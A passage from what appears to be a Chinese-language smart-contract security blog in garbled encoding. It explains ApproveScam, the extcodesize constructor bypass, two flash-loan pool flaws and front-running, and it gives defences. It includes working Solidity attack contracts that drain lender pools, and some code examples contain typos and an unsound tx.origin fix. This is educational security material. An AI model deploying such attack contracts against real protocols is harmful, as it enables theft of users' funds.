class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Alice approves Eve to transfer an unlimited amount of tokens from Alice&#x27;s account</span><br><span class="line">ERC20Contract.approve(address(eve), type(uint256).max);</span><br><span class="line"></span><br><span class="line">// Eve uses the authorization to transfer all tokens from Alice&#x27;s account</span><br><span class="line">ERC20Contract.transferFrom(address(alice), address(eve), 1000);</span><br></pre></td></tr></table></figure><h3 id="ApproveScançš„åæœ"><a href="#ApproveScançš„åæœ" class="headerlink" title="ApproveScançš„åæœ"></a>ApproveScançš„åæœ</h3><p>ApproveScam æ¼æ´èƒŒåçš„åŸç†è™½ç„¶ç®€å•ï¼Œä½†é€ æˆçš„æŸå¤±å´æ˜¯ç¾éš¾æ€§çš„ã€‚ä¸€æ—¦ç”¨æˆ·è½»æ˜“æˆæƒæŸä¸ªåœ°å€ï¼Œæ”»å‡»è€…ä¾¿å¯ä»¥åœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œè½»æ¾å°†ç”¨æˆ·è´¦æˆ·ä¸­çš„æ‰€æœ‰ä»£å¸è½¬èµ°ã€‚</p><p>æ­¤å¤–ï¼ŒApproveScam æ¼æ´è¿˜å¯èƒ½è¢«æ»¥ç”¨äºæ´—é’±ç­‰å…¶ä»–éæ³•æ´»åŠ¨ã€‚æ€»è€Œè¨€ä¹‹ï¼ŒApproveScam æ˜¯ä¸€ä¸ªä¸¥é‡çš„å®‰å…¨é£é™©ï¼Œå¼€å‘äººå‘˜å’Œç”¨æˆ·éœ€è¦è®¤çœŸå¯¹å¾…ã€‚</p><h3 id="å¦‚ä½•é¢„é˜²ApproveScan"><a href="#å¦‚ä½•é¢„é˜²ApproveScan" class="headerlink" title="å¦‚ä½•é¢„é˜²ApproveScan"></a>å¦‚ä½•é¢„é˜²ApproveScan</h3><p>é¢„é˜² ApproveScam æ¼æ´çš„æœ€ä½³æ–¹æ³•æ˜¯è°¨æ…ä½¿ç”¨æ‰¹å‡†åŠŸèƒ½ï¼Œå°¤å…¶æ˜¯åœ¨æˆæƒé‡‘é¢æ—¶ã€‚è¯·éµå¾ªä»¥ä¸‹åŸåˆ™ï¼š</p><ul><li>ä»…åœ¨å¿…è¦æ—¶è°ƒç”¨æ‰¹å‡†åŠŸèƒ½ï¼Œé¿å…è¿‡åº¦ä½¿ç”¨æˆ–æ»¥ç”¨ã€‚</li><li>æ ¹æ®å®é™…éœ€è¦è®¾ç½®æˆæƒé‡‘é¢ï¼Œä¾‹å¦‚permit(spender, amount)è€Œä¸æ˜¯permit(spender, type(uint256).max) ã€‚</li><li>å®ŒæˆåŠŸèƒ½åç«‹å³æ’¤é”€ä¹‹å‰çš„æˆæƒï¼Œå³approve(spender, 0) ã€‚</li><li>åœ¨æ™ºèƒ½åˆçº¦å¼€å‘è¿‡ç¨‹ä¸­ï¼Œå½»åº•æ£€æŸ¥æ‰¹å‡†åŠŸèƒ½çš„ä½¿ç”¨ï¼Œä»¥é˜²æ­¢ ApproveScam æ¼æ´ã€‚</li></ul><h2 id="åˆçº¦è´¦æˆ·æ£€æŸ¥æ¼æ´"><a href="#åˆçº¦è´¦æˆ·æ£€æŸ¥æ¼æ´" class="headerlink" title="åˆçº¦è´¦æˆ·æ£€æŸ¥æ¼æ´"></a>åˆçº¦è´¦æˆ·æ£€æŸ¥æ¼æ´</h2><p>åœ¨ Solidity æ™ºèƒ½åˆçº¦å¼€å‘ä¸­ï¼Œå¼€å‘è€…ç»å¸¸ä¼šä½¿ç”¨å„ç§æ£€æŸ¥æœºåˆ¶æ¥ä¿è¯åˆçº¦çš„å®‰å…¨ã€‚ä¸€ç§å¸¸è§çš„åšæ³•æ˜¯ä½¿ç”¨<strong>extcodesizeå‡½æ•°</strong>æ¥æ£€æŸ¥è°ƒç”¨è€…åœ°å€çš„ä»£ç å¤§å°ï¼Œä»è€ŒåŒºåˆ†åˆçº¦è´¦æˆ·å’Œå¤–éƒ¨æ‹¥æœ‰è´¦æˆ·ï¼ˆEOAï¼‰ã€‚ç„¶è€Œï¼Œå¦‚æœæ»¥ç”¨è¯¥æœºåˆ¶ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨åˆçº¦æ„é€ å‡½æ•°ä¸­çš„ä¸´æ—¶æ¼æ´ç»•è¿‡æ£€æŸ¥ï¼Œå‘èµ·æ¶æ„æ“ä½œã€‚</p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>æ™ºèƒ½åˆçº¦åœ¨åˆæ¬¡éƒ¨ç½²æ—¶ï¼Œä¼šå…ˆæ‰§è¡Œæ„é€ å‡½æ•°ä»£ç ï¼Œåœ¨æ„é€ å‡½æ•°æ‰§è¡Œå®Œæˆä¹‹å‰ï¼Œæ–°éƒ¨ç½²çš„åˆçº¦åœ°å€ä¸Šå…¶å®æ˜¯æ²¡æœ‰ä»»ä½•å­—èŠ‚ç å­˜åœ¨çš„ï¼Œè¿™å°±å¯¼è‡´äº†åŸºäº extcodesize çš„æ£€æŸ¥å­˜åœ¨ä¸€ä¸ªç›²ç‚¹ï¼šå¦‚æœæ”»å‡»è€…åœ¨æ„é€ å‡½æ•°å†…ç«‹åˆ»è°ƒç”¨ç›®æ ‡åˆçº¦ï¼Œç”±äºæ”»å‡»è€…åˆçº¦åœ°å€ä¸Šçš„å­—èŠ‚ç è¿˜æœªå­˜å‚¨ï¼Œå› æ­¤<strong>extcodesize(address(this))ä¼š</strong>è¿”å› 0ï¼Œä»è€Œç»•è¿‡isContract çš„æ£€æŸ¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        // At this point, extcodesize(address(this)) == 0</span><br><span class="line">        // Bypass the isContract check of the target contract</span><br><span class="line">        Target(_target).isContract(address(this));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç æ¼”ç¤ºäº†ä¸€ä¸ªå…¸å‹çš„æ”»å‡»åœºæ™¯ï¼ŒAttackåˆçº¦åœ¨æ„é€ æ—¶ä¼ å…¥Targetåˆçº¦åœ°å€ï¼Œå¹¶ç«‹å³åœ¨æ„é€ å‡½æ•°å†…è°ƒç”¨Target.isContract()å‡½æ•°ã€‚ç”±äºAttackçš„éƒ¨ç½²å°šæœªå®Œæˆï¼ŒisContract(address(this))å°†è¿”å› falseï¼Œä»è€Œå…è®¸æ”»å‡»è€…ç»•è¿‡è¿™ä¸€å±‚ä¿æŠ¤å¹¶è°ƒç”¨å—ä¿æŠ¤çš„å‡½æ•°ã€‚</p><h3 id="æ¼æ´åˆ©ç”¨æ¼”ç¤º"><a href="#æ¼æ´åˆ©ç”¨æ¼”ç¤º" class="headerlink" title="æ¼æ´åˆ©ç”¨æ¼”ç¤º"></a>æ¼æ´åˆ©ç”¨æ¼”ç¤º</h3><p>Targetåˆçº¦æœ‰ä¸€ä¸ªçŠ¶æ€å˜é‡pwned,åˆå§‹è®¾ç½®ä¸ºfalse,è¯¥åˆçº¦çš„è®¾è®¡åˆè¡·æ˜¯åªå…è®¸å¤–éƒ¨è´¦æˆ·ä¿®æ”¹å…¶å€¼ï¼Œè€Œä¸å…è®¸åˆçº¦è´¦æˆ·ä¿®æ”¹ï¼Œå®ƒé€šè¿‡isContractå‡½æ•°å®ç°è€…ä¸€ç‚¹ï¼Œè¯¥å‡½æ•°ä¾èµ–äºextaodesizeçš„æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.18;</span><br><span class="line"></span><br><span class="line">contract Target &#123;</span><br><span class="line">    function isContract(address account) public view returns (bool) &#123;</span><br><span class="line">        // This method relies on extcodesize, which returns 0 for contracts in</span><br><span class="line">        // construction, since the code is only stored at the end of the</span><br><span class="line">        // constructor execution.</span><br><span class="line">        uint size;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            size := extcodesize(account)</span><br><span class="line">        &#125;</span><br><span class="line">        return size &gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bool public pwned = false;</span><br><span class="line"></span><br><span class="line">    function protected() external &#123;</span><br><span class="line">        require(!isContract(msg.sender), &quot;no contract allowed&quot;);</span><br><span class="line">        pwned = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬è¦ä¿®æ”¹pwnedçš„å€¼ï¼Œä½¿ç”¨ä»¥ä¸‹ä»£ç æ˜¯ä¸èƒ½æ”»å‡»æˆåŠŸçš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract FailedAttack &#123;</span><br><span class="line">    // Attempting to call Target.protected will fail,</span><br><span class="line">    // Target blocks calls from contracts</span><br><span class="line">    function pwn(address _target) external &#123;</span><br><span class="line">        // This will fail</span><br><span class="line">        Target(_target).protected();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºTargetåˆçº¦åªå…è®¸å¤–éƒ¨è´¦æˆ·ï¼ˆEOAï¼‰è°ƒç”¨ï¼Œè€Œæˆ‘ä»¬çš„æ”»å‡»åˆçº¦æ˜¯ä¸èƒ½ä¿®æ”¹çš„</p><p>å¦‚æœæˆ‘ä»¬åœ¨æ„é€ å‡½æ•°ä¸­è°ƒç”¨ï¼Œå…¶å°±ä¼šç»•è¿‡isContractçš„æ£€æŸ¥ï¼Œæ”»å‡»ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    bool public isContract;</span><br><span class="line">    address public addr;</span><br><span class="line"></span><br><span class="line">    // When contract is being created, code size (extcodesize) is 0.</span><br><span class="line">    // This will bypass the isContract() check</span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        isContract = Target(_target).isContract(address(this));</span><br><span class="line">        addr = address(this);</span><br><span class="line">        // This will work</span><br><span class="line">        Target(_target).protected();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é¢„é˜²æªæ–½"><a href="#é¢„é˜²æªæ–½" class="headerlink" title="é¢„é˜²æªæ–½"></a>é¢„é˜²æªæ–½</h3><p>ä¸ºäº†ä¿®å¤æ­¤æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ä¾èµ–extcodesizeæ¥æ‰§è¡Œæ£€æŸ¥ï¼Œè€Œæ˜¯ç›´æ¥æ¯”è¾ƒtx.originå’Œmsg.senderæ˜¯å¦ç›¸åŒã€‚ç”±äºtx.originå§‹ç»ˆæŒ‡å‘æœ€åˆå‘èµ·äº¤æ˜“çš„ EOA åœ°å€ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æœ‰æ•ˆåŒºåˆ†åˆçº¦å’Œ EOA è°ƒç”¨ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function isContract(address account) public view returns (bool) &#123;</span><br><span class="line">    require(tx.origin == msg.sender);</span><br><span class="line">    return account.code.length &gt; 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="é—ªç”µè´·æ”»å‡»"><a href="#é—ªç”µè´·æ”»å‡»" class="headerlink" title="é—ªç”µè´·æ”»å‡»"></a>é—ªç”µè´·æ”»å‡»</h2><h3 id="é—ªç”µè´·è´·æ¬¾äººæ¼æ´1"><a href="#é—ªç”µè´·è´·æ¬¾äººæ¼æ´1" class="headerlink" title="é—ªç”µè´·è´·æ¬¾äººæ¼æ´1"></a>é—ªç”µè´·è´·æ¬¾äººæ¼æ´1</h3><p> MyTokenæ˜¯æ ‡å‡†çš„ ERC20 ä»£å¸ï¼Œä½œä¸ºLenderPoolå†…å¯ä¾›å€Ÿè´·çš„èµ„äº§ã€‚</p><p> LenderPoolåˆçº¦å…è®¸ç”¨æˆ·æ‰§è¡Œé—ªç”µè´·äº¤æ˜“ï¼Œå…¶flashLoanå‡½æ•°æ¥å—ç”¨æˆ·è¯·æ±‚ï¼Œå€Ÿå‡ºä¸€å®šæ•°é‡çš„ä»£å¸ï¼Œè°ƒç”¨ç›®æ ‡åˆçº¦ä¸Šçš„ç‰¹å®šæ“ä½œï¼Œå¹¶å¿è¿˜è´·æ¬¾ã€‚åœ¨å‡½æ•°çš„æœ€åï¼Œå®ƒä¼šéªŒè¯å¿è¿˜åçš„ä½™é¢æ˜¯å¦å¤§äºå¿è¿˜å‰çš„ä½™é¢ã€‚é€šå¸¸ï¼Œå¿è¿˜é‡‘é¢åŒ…æ‹¬æœ¬é‡‘å’Œåˆ©æ¯ã€‚å› æ­¤ï¼Œåœ¨å‘èµ·è´·æ¬¾åï¼Œæ± å­çš„ä½™é¢åº”è¯¥å¢åŠ ã€‚å¦åˆ™ï¼Œè´·æ¬¾äº¤æ˜“å¤±è´¥ã€‚</p><p> è¯¥åˆçº¦çš„æ¼æ´åœ¨äºç›®æ ‡åˆçº¦çš„ä½ä»£ç è°ƒç”¨ã€‚ç”±äºè¿™é‡Œæ²¡æœ‰ä»»ä½•éªŒè¯æœºåˆ¶ï¼Œå¹¶ä¸”è°ƒç”¨å‡½æ•°æä¾›äº†å¹¿æ³›çš„æ“ä½œèƒ½åŠ›ï¼Œä¾‹å¦‚è·å–LenderPoolä¸­MyTokenä»£å¸çš„æˆæƒï¼Œå› æ­¤å¯ä»¥ä»æ± ä¸­æŠ½å–æ‰€æœ‰èµ„äº§ã€‚<br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> // SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.18;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract LenderPool is ReentrancyGuard &#123;</span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    MyToken public token;</span><br><span class="line"></span><br><span class="line">    error RepayFailed();</span><br><span class="line"></span><br><span class="line">    constructor(MyToken _token) &#123;</span><br><span class="line">        token = _token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(</span><br><span class="line">        uint256 amount,</span><br><span class="line">        address borrower,</span><br><span class="line">        address target,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external nonReentrant returns (bool) &#123;</span><br><span class="line">        uint256 balanceBefore = token.balanceOf(address(this));</span><br><span class="line">        bool ret = token.transfer(borrower, amount);</span><br><span class="line"></span><br><span class="line">        // it&#x27;s dangerous</span><br><span class="line">        target.functionCall(data);</span><br><span class="line"></span><br><span class="line">        if (token.balanceOf(address(this)) &lt; balanceBefore)</span><br><span class="line">            revert RepayFailed();</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MyToken is ERC20, Ownable &#123;</span><br><span class="line">    constructor() ERC20(&quot;MyToken&quot;, &quot;MTK&quot;) Ownable(msg.sender) &#123;</span><br><span class="line">        _mint(msg.sender, 10000 * 10**decimals());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>åœ¨<strong>Attackåˆçº¦</strong>çš„æ”»å‡»å‡½æ•°ä¸­ï¼Œæ”»å‡»è€…ä»æ± åˆçº¦å‘èµ·ä¸€æ¬¡é—ªç”µè´·ï¼Œå€Ÿå…¥ 0 ä¸ªä»£å¸ï¼Œå› ä¸ºæ­¤æ—¶ä»–ä»¬ä¸éœ€è¦è¿™äº›ä»£å¸ã€‚ç›¸åï¼Œä»–ä»¬æ„é€  calldataä»¥è·å¾—<strong>LenderPool</strong>çš„æ‰¹å‡†ã€‚ä¸€æ—¦<strong>flashLoan</strong>å‡½æ•°æˆåŠŸæ‰§è¡Œï¼Œä»–ä»¬å°±ä¼šè·å¾—æˆæƒå¹¶æ‰§è¡Œ<strong>transferFrom</strong>æ“ä½œå°†ä»£å¸è½¬ç§»åˆ°è‡ªå·±çš„åœ°å€ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    LenderPool pool;</span><br><span class="line">    MyToken token;</span><br><span class="line"></span><br><span class="line">    constructor(address _pool, address _token) &#123;</span><br><span class="line">        pool = LenderPool(_pool);</span><br><span class="line">        token = MyToken(_token);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack()</span><br><span class="line">        public</span><br><span class="line">        returns (uint256 before_balance, uint256 after_balance)</span><br><span class="line">    &#123;</span><br><span class="line">        before_balance = token.balanceOf(address(this));</span><br><span class="line">        bytes memory _calldata = abi.encodeWithSignature(</span><br><span class="line">            &quot;approve(address,uint256)&quot;,</span><br><span class="line">            address(this),</span><br><span class="line">            10000</span><br><span class="line">        );</span><br><span class="line">        pool.flashLoan(0, address(this), address(token), _calldata);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        token.transferFrom(address(pool), address(this), 10000);</span><br><span class="line">        after_balance = token.balanceOf(address(this));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é—ªç”µè´·è´·æ¬¾äººæ¼æ´2"><a href="#é—ªç”µè´·è´·æ¬¾äººæ¼æ´2" class="headerlink" title="é—ªç”µè´·è´·æ¬¾äººæ¼æ´2"></a>é—ªç”µè´·è´·æ¬¾äººæ¼æ´2</h3><p>è¿™æ˜¯ä¸€ä¸ªå…·æœ‰æ¼æ´çš„åˆçº¦</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">import &quot;solady/src/utils/SafeTransferLib.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IFlashLoanEtherReceiver &#123;</span><br><span class="line">    function execute() external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract EthLenderPool &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    error RepayFailed();</span><br><span class="line">    event Deposit(address indexed who, uint256 amount);</span><br><span class="line">    event Withdraw(address indexed who, uint256 amount);</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            balances[msg.sender] += msg.value;</span><br><span class="line">        &#125;</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        uint256 amount = balances[msg.sender];</span><br><span class="line">        delete balances[msg.sender];</span><br><span class="line">        emit Withdraw(msg.sender, amount);</span><br><span class="line">        SafeTransferLib.safeTransferETH(msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(uint256 amount) external &#123;</span><br><span class="line">        uint256 balanceBefore = address(this).balance;</span><br><span class="line">        IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();</span><br><span class="line">        if (address(this).balance &lt; balanceBefore)</span><br><span class="line">            revert RepayFailed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å­˜æ¬¾å’Œå–æ¬¾å‡½æ•°ç”¨äºå­˜å…¥å’Œæå– ETHï¼Œç”¨æˆ· ETH ä½™é¢è®°å½•åœ¨åˆçº¦çš„ä½™é¢çŠ¶æ€å˜é‡ä¸­ã€‚</li><li>flashLoanå‡½æ•°ç”¨äºå€Ÿå‡ºèµ„é‡‘ã€‚åœ¨è¿™é‡Œï¼Œå€Ÿæ¬¾äººå¿…é¡»å®ç°IFlashLoanEtherReceiveræ¥å£ã€‚å½“èµ„é‡‘å‘é€åˆ°å€Ÿæ¬¾äººåˆçº¦æ—¶ï¼Œè¿˜ä¼šè°ƒç”¨æ¥å£ä¸­å®šä¹‰çš„å›è°ƒå‡½æ•°execute ï¼Œå…è®¸å€Ÿæ¬¾äººæ‰§è¡Œè‡ªå®šä¹‰ä¸šåŠ¡é€»è¾‘ã€‚ä½†æ˜¯ï¼Œå¿…é¡»ç¡®ä¿å€Ÿå…¥çš„èµ„é‡‘å¿è¿˜ç»™è´·æ–¹æ± ï¼Œä»¥ä¿æŒä½™é¢å¤§äºæˆ–ç­‰äºåŸå§‹ä½™é¢ã€‚å¦åˆ™å°†å¯¼è‡´å€Ÿè´·å¤±è´¥ã€‚<blockquote><p>é£é™©ï¼šåªæ£€æŸ¥è¿˜æ¬¾åçš„ä½™é¢å¤§å°ã€‚ä½†è¿™ä¸ªä½™é¢å¯èƒ½åŒ…æ‹¬ç”¨æˆ·åœ¨åˆçº¦ä¸­æŒæœ‰çš„èµ„äº§ï¼Œç”¨æˆ·å¯ä»¥éšæ—¶æå–è¿™äº›èµ„äº§ã€‚</p></blockquote></li></ul><p>ä»¥ä¸‹æ˜¯æ”»å‡»è€…åˆçº¦ï¼Œåœ¨æ‰§è¡Œå›è°ƒå‡½æ•°ä¸­ï¼Œæ”»å‡»è€…å°†å€Ÿå…¥çš„èµ„é‡‘å­˜å›æ± ä¸­ï¼Œç¡®ä¿æ± å­çš„ä½™é¢ä¸ä¼šå‡å°‘ï¼Œä½†è¿™äº›èµ„é‡‘ç°åœ¨è¢«è®°å½•ä¸ºæ”»å‡»è€…</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack is IFlashLoanEtherReceiver&#123;</span><br><span class="line">    EthLenderPool pool;</span><br><span class="line"></span><br><span class="line">    constructor(address _pool) &#123;</span><br><span class="line">        pool = EthLenderPool(_pool);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint amount) public &#123;</span><br><span class="line">        pool.flashLoan(amount);</span><br><span class="line">        pool.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() external payable &#123;</span><br><span class="line">        pool.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æŠ¢è·‘äº¤æ˜“"><a href="#æŠ¢è·‘äº¤æ˜“" class="headerlink" title="æŠ¢è·‘äº¤æ˜“"></a>æŠ¢è·‘äº¤æ˜“</h2><p>å®ƒçš„æœ¬è´¨å°±æ˜¯åˆ©ç”¨äº†äº¤æ˜“é¡ºåºè¿›è¡Œè·åˆ©</p><p>å…ˆè¯´ä»¥ä¸‹å†…æ¶µï¼Œé€šä¿—æ¥è®²ï¼Œå°±æ˜¯è¢«äººæ¯”ä½ å¿«ä¸€æ­¥ï¼Œå› ä¸ºåœ¨åŒºå—é“¾ä¸Šçš„äº¤æ˜“éƒ½æ˜¯å…¬å¼€é€æ˜çš„ï¼Œå°±æ˜¯èƒ½å¤Ÿè·å–å…¶ä»–äººçš„äº¤æ˜“ï¼Œæ”»å‡»è€…å‘ç°äº†ä½ çš„äº¤æ˜“ä¿¡æ¯ï¼Œç„¶åä»–æ”¯å‡ºæ›´é«˜çš„gasè´¹ç”¨ï¼Œåœ¨ä½ ä¹‹å‰è¿›è¡Œäº¤æ˜“ï¼Œå°±ä¼šå¯¼è‡´ä¸€äº›é—®é¢˜å‡ºç°</p><blockquote><p>åœ¨ä»¥å¤ªåŠäº¤æ˜“ä¸­ï¼Œå½“ä½ å‘èµ·ä¸€ä¸ªäº¤æ˜“æ—¶ï¼Œé¦–å…ˆä¼šè¿›è¡Œæ‰“åŒ…è¿›å…¥äº¤æ˜“æ± ï¼Œç„¶åçŸ¿å·¥æ¥å¤„ç†è¿™äº›äº¤æ˜“ï¼Œå½“ç„¶ï¼Œä¼˜å…ˆå¤„ç†gasè´¹æ›´é«˜çš„äº¤æ˜“<br>ä¸¾ä¾‹ï¼šè¿™æ˜¯ä¸€ä¸ªçŒœè°œæ¸¸æˆï¼ŒçŒœå¯¹å³å¯è·å¾—10ä¸ªehter</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier:MIT</span><br><span class="line"></span><br><span class="line">pragma solidity^0.8.17;</span><br><span class="line"></span><br><span class="line">constract FindThisHash&#123;</span><br><span class="line">    bytes32 public constant hash = 111111;</span><br><span class="line"></span><br><span class="line">    constructor () payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function solve (string memory solution) public&#123;</span><br><span class="line">        require(hash == keccak256(abi.encodePascked(solution)),&quot;Incorrect answer&quot;);</span><br><span class="line">        (bool sent, ) = msg.sender.call&#123;valueï¼š10 ehter&#125;(&quot;&quot;);</span><br><span class="line">        require(sent,&quot;Failed to send Ehter&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AçŒœä¸­äº†ç­”æ¡ˆï¼Œè°ƒç”¨äº†solveå‡½æ•°è¾“å…¥æ­£ç¡®çš„ç­”æ¡ˆæ­¤æ—¶çš„gasçš„ä»·æ ¼è®¾ç½®ä¸º15gweiï¼Œç„¶åæœ‰ä¸ªäººåœ¨äº¤æ˜“æ± å‘ç°äº†è¿™ä¸ªï¼ŒBå°±è·å–äº†Açš„ç­”æ¡ˆï¼Œä»–åˆç”¨æ¯”15gweié«˜çš„ä»·æ ¼è°ƒç”¨solveå‡½æ•°ï¼Œç„¶åçŸ¿å·¥å°±ä¼šå…ˆå¤„ç†Bçš„äº¤æ˜“ï¼Œæœ€åBè·å¾—äº†10ä»¥å¤ªå¸çš„å¥–åŠ±</p><h3 id="é¢„é˜²æªæ–½-1"><a href="#é¢„é˜²æªæ–½-1" class="headerlink" title="é¢„é˜²æªæ–½"></a>é¢„é˜²æªæ–½</h3><p>é‡‡ç”¨ Commit-Reveal çš„æ¨¡å¼ï¼Œè¯¥æ–¹æ¡ˆæœ‰ä¸¤ä¸ªé˜¶æ®µï¼šCommit é˜¶æ®µï¼Œæäº¤ç‰¹å®šçš„å€¼ï¼ˆæ¯”å¦‚åŒ…å«ç­”æ¡ˆçš„ Hash å€¼ï¼Œç­”æ¡ˆå¹¶æ²¡æœ‰ç›´æ¥æš´éœ²å‡ºæ¥ï¼‰ï¼›ä»¥åŠ Reveal é˜¶æ®µï¼Œå…¶ä¸­æ­ç¤ºå¹¶æ£€æŸ¥å€¼ï¼ˆæ ¡éªŒç­”æ¡ˆæ˜¯å¦æ­£ç¡®ï¼‰ã€‚</p><p>ä¸ºäº†æ›´å¥½åœ°ç†è§£ï¼Œå¯ä»¥æƒ³è±¡ä¸€ä¸‹ï¼Œå‘é€è€… Alice å°†ä¸€æ¡æ¶ˆæ¯æ”¾å…¥ä¸€ä¸ªä¸Šé”çš„ç›’å­ä¸­ï¼Œç„¶åå°†å…¶äº¤ç»™æ¥æ”¶è€… Bobã€‚Bob ä»¥åŠå…¶ä»–ä»»ä½•äººæ— æ³•è®¿é—®è¯¥æ¶ˆæ¯ï¼Œå› ä¸ºå®ƒè¢«é”åœ¨ç›’å­é‡Œï¼Œä½†æ˜¯å½“ Alice æƒ³è¦é€éœ²è¯¥æ¶ˆæ¯æ—¶ï¼Œå¥¹å¯ä»¥è§£é”ç›’å­å¹¶å°†è¯¥æ¶ˆæ¯æ˜¾ç¤ºç»™ Bobã€‚</p><h2 id="ç­¾åé‡æ”¾æ”»å‡»"><a href="#ç­¾åé‡æ”¾æ”»å‡»" class="headerlink" title="ç­¾åé‡æ”¾æ”»å‡»"></a>ç­¾åé‡æ”¾æ”»å‡»</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æŠ¢å…ˆäº¤æ˜“æ”»å‡»</title>
      <link href="/2024/10/07/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93%E6%94%BB%E5%87%BB/"/>
      <url>/2024/10/07/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93%E6%94%BB%E5%87%BB/</url>
      
